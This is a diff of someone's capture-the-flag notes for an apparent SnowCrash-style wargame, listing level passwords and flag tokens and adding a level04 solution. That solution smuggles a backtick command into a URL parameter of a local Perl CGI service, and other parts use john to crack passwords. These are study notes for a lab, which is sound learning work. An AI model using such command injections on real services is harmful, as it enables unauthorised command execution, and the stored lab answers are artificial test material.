@@ -1,14 +1,12 @@
 ```b
 flag00  nottoohardhere 
 level01  x24ti5gi3x0ol2eh4esiuxias
-
 flag01  abcdefg
 level02  f2av5il02puano7naaf6adaaf
-
 flag02  ft_waNDReL0L
 level03  kooda2puivaav1idi4f57q8iq
-
 level04  qi0maab88jeaj46qoumi7maus
+level05  ne2searoevaevoem4ov4ar8ap
 ```
 
 
@@ -47,7 +45,7 @@ for i in range(26):
     print(i, ''.join(chr(a + (ord(c) - a + i) % 26) for c in 'cdiiddwpgswtgt'))
 ```
 
-# 00 - token
+- token
 
 ```b
 > su flag00
@@ -88,7 +86,7 @@ Password: nottoohardhere
 > ./john --show __test
 ```
 
-# 01 - token
+- token
 
 ```b
 > su flag01
@@ -174,7 +172,7 @@ print('res/', res)
 # ft_waNDReL0L
 ```
 
-# 02 - token
+- token
 
 ```b
 > su flag02
@@ -229,10 +227,38 @@ getflag: /bin/getflag
 > ./level03
 ```
 
-# 03 - token
+- Token
 
 ```b
 > su level04
 > Password: qi0maab88jeaj46qoumi7maus
 ```
+
+
+# 04 - Todo: perl script problem
+- understand the `.pl`
+- know `2>&1`
+```b
+> nc -vz localhost 4747
+  👆 v: verbose - z: scan if a port is open
+Connection to localhost 4747 port [tcp/*] succeeded!
+
+> curl localhost:4747/?x="\`/bin/getflag\`"
+```
+
+- token
+
+```b
+su level05
+> Password: ne2searoevaevoem4ov4ar8ap
+```
+
+
+# 05 - Todo: `/var/mail` `cronjob`
+
+
+# 06 - Todo: `php` `regex`
+
+
+# 07 - Todo: `ltrace` again
 
